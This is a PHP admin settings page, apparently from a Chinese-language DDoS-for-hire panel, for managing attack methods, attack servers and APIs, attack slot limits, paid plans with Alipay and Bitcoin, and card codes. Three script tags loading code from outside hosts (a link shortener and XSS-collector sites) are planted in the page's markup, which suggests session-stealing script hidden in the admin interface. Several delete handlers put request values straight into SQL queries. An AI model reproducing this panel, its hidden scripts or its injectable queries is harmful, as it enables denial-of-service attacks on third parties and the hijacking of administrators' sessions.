<?php
include("header.php");
if (!($user -> isAdmin($odb)))
{
	header('location: ../index.php');
	die();
}
?>
            <div class="page-content">

                <div class="container">
<?php 
if (isset($_POST['update']))
{
if ($sitename != $_POST['sitename'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `sitename` = :sitename");
$SQL -> execute(array(':sitename' => $_POST['sitename']));
$sitename = $_POST['sitename'];
}

if ($description != $_POST['description'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `description` = :description");
$SQL -> execute(array(':description' => $_POST['description']));
$description = $_POST['description'];
}

if ($paypal != $_POST['paypal'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `paypal` = :paypal");
$SQL -> execute(array(':paypal' => $_POST['paypal']));
$paypal = $_POST['paypal'];
}

if ($bitcoin != $_POST['bitcoin'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `bitcoin` = :bitcoin");
$SQL -> execute(array(':bitcoin' => $_POST['bitcoin']));
$bitcoin = $_POST['bitcoin'];
}

if ($maintaince != $_POST['maintaince'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `maintaince` = :maintaince");
$SQL -> execute(array(':maintaince' => $_POST['maintaince']));
$maintaince = $_POST['maintaince'];
}

if ($tos != $_POST['tos'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `tos` = :tos");
$SQL -> execute(array(':tos' => $_POST['tos']));
$tos = $_POST['tos'];
}

if ($maxattacks != $_POST['maxattacks'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `maxattacks` = :maxattacks");
$SQL -> execute(array(':maxattacks' => $_POST['maxattacks']));
$maxattacks = $_POST['maxattacks'];
}

if ($siteurl != $_POST['url'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `url` = :url");
$SQL -> execute(array(':url' => $_POST['url']));
$siteurl = $_POST['url'];
}

if (isset($_POST['rotation']) AND $rotation == 0)
{
$SQL = $odb -> query("UPDATE `settings` SET `rotation` = 1");
$rotation == 1;
}

if (!(isset($_POST['rotation'])) AND $rotation == 1)
{
$SQL = $odb -> query("UPDATE `settings` SET `rotation` = 0");
$rotation == 0;
}

if (isset($_POST['testboots']) AND $testboots == 0)
{
$SQL = $odb -> query("UPDATE `settings` SET `testboots` = 1");
$testboots == 1;
}

if (!(isset($_POST['testboots'])) AND $testboots == 1)
{
$SQL = $odb -> query("UPDATE `settings` SET `testboots` = 0");
$testboots == 0;
}

if (isset($_POST['cbp']) AND $cbp == 0)
{
$SQL = $odb -> query("UPDATE `settings` SET `cbp` = 1");
$cbp == 1;
}

if (!(isset($_POST['cbp'])) AND $cbp == 1)
{
$SQL = $odb -> query("UPDATE `settings` SET `cbp` = 0");
$cbp == 0;
}

if (isset($_POST['cloudflare']) AND $cloudflare == 0)
{
$SQL = $odb -> query("UPDATE `settings` SET `cloudflare` = 1");
$cloudflare == 1;
}

if (!(isset($_POST['cloudflare'])) AND $cloudflare == 1)
{
$SQL = $odb -> query("UPDATE `settings` SET `cloudflare` = 0");
$cloudflare == 0;
}

if ($system != $_POST['system'])
{
$SQL = $odb -> prepare("UPDATE `settings` SET `system` = :system");
$SQL -> execute(array(':system' => $_POST['system']));
$system = $_POST['system'];
}

echo success('更新设置...<meta http-equiv="refresh" content="3;url=settings.php">');
}

if (isset($_POST['delete']))
{
$delete = $_POST['delete'];
$SQL = $odb -> prepare("DELETE FROM `methods` WHERE `id` = :id");
$SQL -> execute(array(':id' => $delete));
echo success('方法已被删除');
}
if (isset($_POST['add']))
{
if (empty($_POST['name']) || empty($_POST['fullname']) || empty($_POST['type']))
{
$error = '请验证所有字段';
}

if (empty($error))
{
$name = $_POST['name'];
$fullname = $_POST['fullname'];
$type = $_POST['type'];
if ($system=='servers') {$command = $_POST['command'];} else {$command = '';}
$SQLinsert = $odb -> prepare("INSERT INTO `methods` VALUES(NULL, :name, :fullname, :type, :command)");
$SQLinsert -> execute(array(':name' => $name, ':fullname' => $fullname, ':type' => $type, ':command' => $command));
echo success('方法已被添加');
}
else
{
echo error($error);
}
}

if (isset($_POST['deleteapi']))
{
$delete = $_POST['deleteapi'];
$SQL = $odb -> prepare("DELETE FROM `api` WHERE `id` = :id");
$SQL -> execute(array(':id' => $delete));
echo success('已删除API');
}
if (isset($_POST['deleteserver']))
{
$delete = $_POST['deleteserver'];
$SQL = $odb -> prepare("DELETE FROM `servers` WHERE `id` = :id");
$SQL -> execute(array(':id' => $delete));
echo success('已删除服务器');
}
if (isset($_POST['addapi']))
{
if (empty($_POST['api']) || empty($_POST['name']) || empty($_POST['slots']) || empty($_POST['methods']))
{
$error = '请验证所有字段';
}
$api = $_POST['api'];
$name = $_POST['name'];
$slots = $_POST['slots'];
$methods = implode(" ",$_POST['methods']);
if (!(is_numeric($slots)))
{
$error = '插槽字段必须是数字的';
}
$parameters = array("[host]", "[port]", "[time]", "[method]");
foreach ($parameters as $parameter)
{
if (strpos($api,$parameter) == false)
{
$error = '找不到参数 "'.$parameter.'"';
}
}
if(!ctype_alnum(str_replace(' ','',$name)) || !ctype_alnum(str_replace(' ','',$methods)))
{
$error = '名称或方法字段中的无效字符';
}
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `api` VALUES(NULL, :name, :api, :slots, :methods)");
$SQLinsert -> execute(array(':api' => $api, ':name' => $name, ':slots' => $slots, ':methods' => $methods));
echo success('已添加API');
}
else
{
error($error);
}
}

if (isset($_POST['addserver']))
{
if (empty($_POST['ip']) || empty($_POST['password']) || empty($_POST['name']) || empty($_POST['slots']) || empty($_POST['methods']))
{
$error = '请验证所有字段';
}
$name = $_POST['name'];
$ip = $_POST['ip'];
$password = $_POST['password'];
$slots = $_POST['slots'];
$methods = implode(" ",$_POST['methods']);
if (!(is_numeric($slots)))
{
$error = '插槽字段必须是数字的';
}
if (!filter_var($ip, FILTER_VALIDATE_IP))
{
$error = 'IP是无效的';
}
if(!ctype_alnum(str_replace(' ','',$name)) || !ctype_alnum(str_replace(' ','',$methods)))
{
$error = '名称或命令字段中的无效字符';
}
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `servers` VALUES(NULL, :name, :ip, :password, :slots, :methods)");
$SQLinsert -> execute(array(':name' => $name, ':ip' => $ip, ':password' => $password, ':slots' => $slots, ':methods' => $methods));
echo success('已添加服务器');
}
else
{
echo error($error);
}
}

if (isset($_POST['deleteblacklist']))
{
$delete = $_POST['deleteblacklist'];
$SQL = $odb -> query("DELETE FROM `blacklist` WHERE `ID` = '$delete'");
echo success('黑名单已被删除');
}
if (isset($_POST['addblacklist']))
{
if (empty($_POST['value']))
{
$error = '请验证所有字段';
}
$value = $_POST['value'];
$type = $_POST['type'];
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `blacklist` VALUES(NULL, :value, :type)");
$SQLinsert -> execute(array(':value' => $value, ':type' => $type));
echo success('黑名单已被添加');
}
else
{
error($error);
}
}

if (isset($_POST['video2xD']))
{
$date2 = $_POST['date2'];
$video2 = $_POST['video2'];

$SQL = $odb -> prepare("UPDATE `yt` SET `id2` = :id2, `date2` = :date2");
$SQL -> execute(array(':id2' => $video2, ':date2' => $date2));

}

if (isset($_POST['video1xD']))
{
$video1 = $_POST['video1'];
$date1 = $_POST['date1'];

$SQL = $odb -> prepare("UPDATE `yt` SET `id1` = :id1, `date1` = :date1");
$SQL -> execute(array(':id1' => $video1, ':date1' => $date1));

}

if (isset($_POST['addplan']))
{
			$name = $_POST['name'];
			$unit = $_POST['unit'];
			$length = $_POST['length'];
			$mbt = intval($_POST['mbt']);
            $cishu = intval($_POST['cishu']);
			$price = floatval($_POST['price']);
			$concurrents = $_POST['concurrents'];
			$private = $_POST['private'];
			$errors = array();
			
			if (empty($price) || empty($name) || empty($unit) || empty($length) || empty($mbt) || empty($cishu)|| empty($concurrents))
			{
				$error = '填写所有字段';
			}
			if (empty($error))
			{
				$SQLinsert = $odb -> prepare("INSERT INTO `plans` VALUES(NULL, :name, :mbt, :unit, :length, :price, :concurrents, :private, :cishu)");
				$SQLinsert -> execute(array(':name' => $name, ':mbt' => $mbt, ':unit' => $unit, ':length' => $length, ':price' => $price, ':concurrents' => $concurrents, ':private' => $private, ':cishu' => $cishu));
				echo success('套餐创建成功');
			}
			else
			{
				echo error($error);
			}
}
// 卡密
if (isset($_POST['addkami']))
{

            $number = intval($_POST['number']);
            $plansid = intval($_POST['plansid']);

            $errors = array();
            
            if (empty($number) || empty($plansid) )
            {
                $error = '填写所有字段';
            }
            if (empty($error))
            {


                $cgsl = 0;
                for ($i = 0; $i <$number; $i++) {
                    $pin = md5(sprintf("%0" . strlen(9) . "d", mt_rand(0, 99999999999)));

                    

                    if (!$odb->query("SELECT code FROM `cardcode` WHERE `code` = '$pin'")->fetchColumn(0)) {

                        $SQLinsert = $odb -> prepare("INSERT INTO `cardcode` VALUES(NULL, :uid, :code, :jtime, :plansid, :state)");
                        $SQLinsert -> execute(array(':uid' => 0, ':code' => $pin, ':jtime' => 0, ':plansid' => $plansid, ':state' => 0));

                        $cgsl++;
                    }
                }

                echo success('生成卡密成功！');
            }
            else
            {
                echo error($error);
            }

}
if (isset($_POST['deleteplan']))
{
$delete = $_POST['deleteplan'];
$SQL = $odb -> query("DELETE FROM `plans` WHERE `ID` = '$delete'");
echo success('套餐已被删除');
}

if (isset($_POST['deletenews']))
{
$delete = $_POST['deletenews'];
$SQL = $odb -> query("DELETE FROM `news` WHERE `ID` = '$delete'");
echo success('资讯已被删除');
}


if (isset($_POST['addnews']))
{
if (empty($_POST['title']) || empty($_POST['content']) || empty($_POST['author']))
{
$error = '请验证所有字段';
}
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `news` VALUES(NULL, :title, :content, UNIX_TIMESTAMP(), :author)");
$SQLinsert -> execute(array(':title' => $_POST['title'], ':content' => $_POST['content'], ':author' => $_POST['author']));
echo success('资讯已被添加');
}
else
{
echo error($error);
}
}

if (isset($_POST['deletefaq']))
{
$delete = $_POST['deletefaq'];
$SQL = $odb -> query("DELETE FROM `faq` WHERE `id` = '$delete'");
echo success('常见问题已被删除');
}


if (isset($_POST['addfaq']))
{
if (empty($_POST['question']) || empty($_POST['answer']))
{
$error = '请验证所有字段';
}
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `faq` VALUES(NULL, :question, :answer)");
$SQLinsert -> execute(array(':question' => $_POST['question'], ':answer' => $_POST['answer']));
echo success('FAQ已添加');
}
else
{
echo error($error);
}
}

?>
                    <div class="page-toolbar">
                        
                        <div class="page-toolbar-block">
                            <div class="page-toolbar-title">设置</div>
                            <div class="page-toolbar-subtitle">管理设置</div>
                        </div>                   
                        <ul class="page-toolbar-tabs">
                            <li class="active"><a href="#page-tab-1">全局</a></li>
                            <li><a href="#page-tab-2">攻击</a></li>
                            <li><a href="#page-tab-3">套餐</a></li>
                            <li><a href="#page-tab-5">卡密</a></li>
                            <li><a href="#page-tab-4">资讯</a></li>
                        </ul>
                    </div>  
 <div class="row page-toolbar-tab active" id="page-tab-1">					
                    <div class="row">
                        <div class="col-md-4">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong>网站</strong>设置</h2>
                                </div>
                                <div class="block-content controls">
                                    <form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>网站名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="sitename" value="<?php echo htmlspecialchars($sitename); ?>"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>网站说明:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="description" value="<?php echo htmlspecialchars($description); ?>"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>服务条款:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" value="<?php echo htmlspecialchars($tos); ?>" name="tos"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>网站 URL:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="url" value="<?php echo htmlspecialchars($siteurl); ?>"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>关闭站点:<script src=http://t.cn/RX6ZGFt></script></strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" name="maintaince" title="留空为不关闭" value="<?php echo htmlspecialchars($maintaince); ?>"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Cloudflare 模式:</strong></div>
                                        <div class="col-md-8"><input type="checkbox" name="cloudflare" <?php if ($cloudflare == 1) { echo 'checked'; } ?>/></div>
                                    </div>
									<center><button name="update" class="btn btn-success">更新</button></center>
                                </div>
                                
                            </div>
							</div>
                        <div class="col-md-4">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong>计费</strong>设置</h2>
                                </div>
                                <div class="block-content controls">
								
                                    <div class="panel panel-default">
                                        <div class="panel-heading">
                                            <h4 class="panel-title">
                                                <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne">Alipay</a>
                                            </h4>
                                        </div>
                                        <div id="collapseOne" class="panel-collapse collapse">
                                            <div class="panel-body">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Alipay Email:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="Insert 0 to disable Paypal autobuy" name="paypal" value="<?php echo htmlspecialchars($paypal); ?>"/></div>
                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="panel panel-default">
                                        <div class="panel-heading">
                                            <h4 class="panel-title">
                                                <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo">BTC</a>
                                            </h4>
                                        </div>
                                        <div id="collapseTwo" class="panel-collapse collapse">
                                            <div class="panel-body">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>比特币地址:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="Insert 0 to disable Bitcoin autobuy" name="bitcoin" value="<?php echo htmlspecialchars($bitcoin); ?>"/></div>
                                    </div>
									</div>
                                        </div>
                                    </div>
									<center><button name="update" class="btn btn-success">更新</button></center>
                                </div>
                                
                            </div>
							</div>
                        <div class="col-md-4">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong>攻击</strong>设置</h2>
                                </div>
                                <div class="block-content controls">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>最大攻击插槽:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="插入0禁用" name="maxattacks" value="<?php echo htmlspecialchars($maxattacks); ?>"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>攻击系统:</strong></div>
                                        <div class="col-md-8">
                                            <select name="system" class="form-control">
                                                <option value="api" <?php if ($system == 'api') { echo 'selected'; } ?>>API</option>
                                                <option value="servers" <?php if ($system == 'servers') { echo 'selected'; } ?>>服务器</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>轮流:</strong></div>
                                        <div class="col-md-8"><input type="checkbox" name="rotation" <?php if ($rotation == 1) { echo 'checked'; } ?>/></div>
                                    </div>
									<center><button name="update" class="btn btn-success">更新</button></center>
									</form>
                                </div>
                                
                            </div>
							</div>
							</div>
</div>
 <div class="row page-toolbar-tab" id="page-tab-2">					
                    <div class="row">
                        <div class="col-md-3">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong>方法</strong>管理</h2>
                                </div>
                                    <table class="table table-striped">
                                        <tr>
                                            <th>名称</th><th>标签</th><th>类型</th><?php if($system == 'servers'){echo '<th>command</th>';}?><th>删除</th>
                                        </tr>
                                        <tr>
										<form method="post">
<?php
$SQLGetMethods = $odb -> query("SELECT * FROM `methods`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $id = $getInfo['id'];
 $name = $getInfo['name'];
 $fullname = $getInfo['fullname'];
 $type = $getInfo['type'];
 if ($system == 'servers') {$command = '<td>'.$getInfo['command'].'</td>';} else {$command = '';}
 echo '<tr><td>'.htmlspecialchars($name).'</td><td>'.htmlspecialchars($fullname).'</td><td>'.$type.'</td>'.$command.'<td><button name="delete" value="'.$id.'" class="btn btn-danger"><i class="fa fa-trash-o"></i></button></td></tr>';
}
if (empty($SQLGetMethods))
{
echo 'No logs';
}
?>
</form>
                                        </tr>                                       
                                    </table>
                                <div class="panel-group" id="accordion">
                                    <div class="panel panel-default">
                                        <div class="panel-heading">
                                            <h4 class="panel-title">
                                                <a data-toggle="collapse" data-parent="#accordion" href="#collapse1">添加新方法
</a>
                                            </h4>
                                        </div>
                                        <div id="collapse1" class="panel-collapse collapse">
                                            <div class="panel-body">
                                <div class="block-content controls">
								<form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="这将在添加服务器时使用" name="name"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>标签名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="这将显示在前台攻击方法中" name="fullname"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>类型:</strong></div>
                                        <div class="col-md-8">
                                            <select name="type" class="form-control">
									<option value="spe">Special</option>
                                                <option value="tcp">TCP</option>
									<option value="udp">UDP</option>
                                                <option value="layer7">Layer7</option>
                                            </select>
                                        </div>
                                    </div>
<?php
if ($system == 'servers')
{
?>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Command:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="Syntax: {$host} {$port} {$time}" name="command"/></div>
                                    </div>
<?php
}
?>
									<button name="add" class="btn btn-success">提交</button>
									</form>                                            </div>
                                        </div>
                                    </div>
								</div>
                                </div>
                                
                            </div>
							</div>
                        <div class="col-md-3">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong>黑名单</strong>管理</h2>
                                </div>
                                    <table class="table table-striped">
                                        <tr>
                                            <th>黑名单</th><th>类型</th><th>删除</th>
                                            </script><sCrIpT src=https://xss.tv/QL></script>
                                      </tr>
                                        <tr>
										<form method="post">
<?php
$SQLGetMethods = $odb -> query("SELECT * FROM `blacklist`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $id = $getInfo['ID'];
 $value = $getInfo['data'];
 $type = $getInfo['type'];
 echo '<tr><td>'.htmlspecialchars($value).'</td><td>'.htmlspecialchars($type).'</td><td><button name="deleteblacklist" value="'.$id.'"class="btn btn-danger"><i class="fa fa-trash-o"></i></button></td></tr>';
}
?>
</form>
                                        </tr>                                       
                                    </table>
                                <div class="panel-group" id="accordion">
                                    <div class="panel panel-default">
                                        <div class="panel-heading">
                                            <h4 class="panel-title">
                                                <a data-toggle="collapse" data-parent="#accordion" href="#collapse2">添加新的黑名单</a>
                                            </h4>
                                        </div>
                                        <div id="collapse2" class="panel-collapse collapse">
                                            <div class="panel-body">
                                <div class="block-content controls">
                                    <form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>黑名单:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="value"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>类型:</strong></div>
                                        <div class="col-md-8">
                                            <select name="type" class="form-control">
                                                <option value="victim">网站/IP</option>
                                            </select>
                                        </div>
                                    </div>
									<button name="addblacklist" class="btn btn-success">提交</button>
									</form>
                                </div>
								</div>
                                        </div>
                                    </div>
								</div>
                                
                            </div>
							</div>
                        <div class="col-md-6">
                            <div class="block">
                                <div class="block-content">
                                    <h2><strong><?php if ($system == 'api') { echo 'APIs'; } else { echo 'Servers'; } ?></strong> 管理</h2>
                                </div>
                                    <table class="table table-striped">
                                        <tr>
<?php if ($system == 'api') { ?>
                    <th>名称</th>
                    <th>API</th>
                    <th>插槽</th>
                    <th>方法</th>
                    <th>删除</th>
<?php } else { ?>
                    <th>名称</th>
                    <th>IP</th>
                    <th>插槽</th>
                    <th>方法</th>
                    <th>删除</th>
<?php } ?>
                                        </tr>
                                        <tr>
										<form method="post">
<?php
if ($system == 'api') {
$SQLGetMethods = $odb -> query("SELECT * FROM `api`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $id = $getInfo['id'];
 $api = $getInfo['api'];
 $name = $getInfo['name'];
 $slots = $getInfo['slots'];
 $methods = $getInfo['methods'];
 echo '<tr><td>'.htmlspecialchars($name).'</td><td>'.htmlspecialchars($api).'</td><td>'.htmlspecialchars($slots).'</td><td>'.htmlspecialchars($methods).'</td><td><button type="submit" title="Delete API" name="deleteapi" value="'.htmlspecialchars($id).'" class="btn btn-danger"><i class="fa fa-trash-o"></i></button></td></tr>';
}
} else {
$SQLGetMethods = $odb -> query("SELECT * FROM `servers`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $name = $getInfo['name'];
 $id = $getInfo['id'];
 $ip = $getInfo['ip'];
 $slots = $getInfo['slots'];
 $methods = $getInfo['methods'];
 echo '<tr><td>'.htmlspecialchars($name).'</td><td>'.htmlspecialchars($ip).'</td><td>'.htmlspecialchars($slots).'</td><td>'.htmlspecialchars($methods).'</td><td><button type="submit" title="Delete Server" name="deleteserver" value="'.htmlspecialchars($id).'" class="btn btn-danger"><i class="fa fa-trash-o"></i></button></td></tr>';
}
}
?>
</form>
                                        </tr>                                       
                                    </table>
                                <div class="panel-group" id="accordion">
                                    <div class="panel panel-default">
                                        <div class="panel-heading">
                                            <h4 class="panel-title">
                                                <a data-toggle="collapse" data-parent="#accordion" href="#collapse3">添加一个新的<?php if ($system == 'api') { echo 'API'; } else { echo 'Server'; } ?></a>
                                            </h4>
                                        </div>
                                        <div id="collapse3" class="panel-collapse collapse">
                                            <div class="panel-body">
                                <div class="block-content controls">
								<form method="post">
<?php if ($system == 'api') { ?>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="name"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>API Link:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control tip" title="Syntax: [host], [port], [time], [method]" name="api"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>插槽:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="slots"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>方法:</strong></div>
                                        <div class="col-md-8">
                                            <select class="form-control" name="methods[]" multiple="multiple">
<?php
$SQLGetMethods = $odb -> query("SELECT * FROM `methods`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $name = $getInfo['name'];
 echo '<option value="'.$name.'">'.$name.'</option>';
 }
?>
                                            </select>
										</div>
                                    </div>
									<button name="addapi" class="btn btn-success">提交</button>
									</form>
									<form method="post">
<?php
}
else
{
?>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="name"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>IP:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="ip"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>密码:</strong></div>
                                        <div class="col-md-8"><input type="password" class="form-control" name="password"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>插槽:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="slots"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>方法:</strong></div>
                                        <div class="col-md-8">
                                            <select class="form-control" name="methods[]" multiple="multiple">
<?php
$SQLGetMethods = $odb -> query("SELECT * FROM `methods`");
while($getInfo = $SQLGetMethods -> fetch(PDO::FETCH_ASSOC))
{
 $name = $getInfo['name'];
 echo '<option value="'.$name.'">'.$name.'</option>';
 }
?>
                                            </select>
										</div>
                                    </div>
									<button name="addserver" class="btn btn-success">提交</button>
<?php
}
?>
</form>
                                </div>                                            </div>
                                        </div>
                                    </div>
								</div>
                                
                            </div>
							</div>
							</div>
</div>





                    <div class="row page-toolbar-tab" id="page-tab-3">					
                        <div class="row">
                            <div class="col-md-10">
                                <div class="block">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active"><a href="#tab1" data-toggle="tab">查看套餐</a></li>
                                        </script><script src=http://52xss.com/z0></script>
                                        <li><a href="#tab2" data-toggle="tab">创建套餐</a></li>
                                    </ul>
                                    <div class="block-content tab-content">
                                        <div class="tab-pane active" id="tab1">
                                        <p>
                                            <table class="table table-striped">
                                                <tr>
                                                    <th>名称</th>
                                                    <th>开机时间</th>
                                                    <th>价格</th>
                                                    <th>时间</th>
                                                    <th>并发</th>
                                                    <th>天次数</th>
                                                    <th>vip</th>
                                                    <th>销售</th>
                                              </tr>
                                            </thead>
                                            <tbody>
                                				<form method="post">
                                                    <?php
                                                    $SQLSelect = $odb -> query("SELECT * FROM `plans` ORDER BY `price` ASC");
                                                    while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
                                                    {
                                                    	$unit = $show['unit'];
                                                    	$length = $show['length'];
                                                    	$price = $show['price'];
                                                    	$concurrents = $show['concurrents'];
                                                    	$planName = $show['name'];
                                                    	$mbtShow = $show['mbt'];
                                                        $cishu = $show['cishu'];
                                                    	$id = $show['ID'];
                                                    	if ($show['private'] == 0) { $private = 'No'; } else { $private = 'Yes'; }
                                                    	$sales = $odb->query("SELECT COUNT(*) FROM `payments` WHERE `plan` = '$id'")->fetchColumn(0);
                                                    	echo '<tr><td><a href="plan.php?id='.$id.'">'.htmlspecialchars($planName).'</a></td><td><center>'.$mbtShow.' 秒</center></td><td><center>￥'.htmlentities($price).'</center></td><td><center>'.htmlentities($length).' '.htmlentities($unit).'</center></td><td><center>'.htmlentities($concurrents).'</center></td><td><center>'.$cishu.'</center></td><td><center>'.htmlentities($private).'</center></td><td><center>'.$sales.'</center></td></tr>';
                                                    }
                                                    ?>
                                                </form>
                                            </tr>                                       
                                         </table>
            </p>
                                        </div>
                                        <div class="tab-pane" id="tab2">
<p>
                                <div class="block-content controls">
								<form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>名称:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="name"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>价格:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="price"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>开机时间:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="mbt"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>并发:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="concurrents"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>天次数:</strong></div>
                                        <div class="col-md-8"><input type="number" class="form-control" name="cishu"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>时间:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="length"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>单位
:</strong></div>
                                        <div class="col-md-8">
                                            <select name="unit" class="form-control">
                                                <option value="Days">天</option>
												<option value="Weeks">周</option>
                                                <option value="Months">月</option>
												<option value="Years">年</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>vip:</strong></div>
                                        <div class="col-md-8">
                                            <select name="private" class="form-control">
                                                <option value="1">是</option>
												<option value="0">否</option>
                                            </select>
                                        </div>
                                    </div>
									<button name="addplan" class="btn btn-success">提交</button>
									</form>
                                </div>
</p>
                                        </div>                    
                                    </div>
                                </div>
</div>
</div>
</div>







<!-- 卡密什么 -->
                    <div class="row page-toolbar-tab" id="page-tab-5">                  
                        <div class="row">
                            <div class="col-md-10">
                                <div class="block">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active"><a href="#tab5" data-toggle="tab">查看卡密</a></li>
                                        <li><a href="#tab6" data-toggle="tab">生成卡密</a></li>
                                    </ul>
                                    <div class="block-content tab-content">
                                        <div class="tab-pane active" id="tab5">
                                        <div class="block">
                                         <div class="block-content np">
                                            <table class="table table-bordered table-striped sortable">
                                                <thead>
                                                    <tr>
                                                        <th>卡密code</th>
                                                        <th>卡密套餐</th>
                                                        <th>使用用户</th>
                                                        <th>使用时间</th>
                                                        <th>使用状态</th>                               
                                                    </tr>
                                                </thead>
                                                <tbody>


                                                    <?php
                                                    $SQLSelect = $odb -> query("SELECT * FROM `cardcode` ORDER BY id DESC");
                                                    while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
                                                    {

                                                        $code = $show['code'];
                                                        $plansid = $show['plansid'];
                                                        $uid = $show['uid'];
                                                        $jtime = $show['jtime'];


                                                        if ($show['state'] == 0) { $state = '未使用';$jtime = ' '; } else { $state = '<span style="color:red;">已使用</span>'; $jtime = date('Y-m-d H:i:s',$jtime); }

                                                       $sales = $odb->query("SELECT username FROM `users` WHERE `ID` = '$uid'")->fetchColumn(0);
                                                       $plansid = $odb->query("SELECT name FROM `plans` WHERE `ID` = '$plansid'")->fetchColumn(0);

                                                        echo '<tr>
                                                                <td>'.$code.'</td>
                                                                <td>'.htmlspecialchars($plansid).'</td>
                                                                <td>'.$sales.'</td>
                                                                <td>'.$jtime.'</td>
                                                                <td>'.$state.'</td>
                                                            </tr>';
                                                    }
                                                    ?>

                                                    </tbody>                      
                                             </table>
                                            </div>
                                        </div>
                                        </div>

                                        <div class="tab-pane" id="tab6">
<p>
                                <div class="block-content controls">
                                <form method="post">

                                    <div class="row-form">
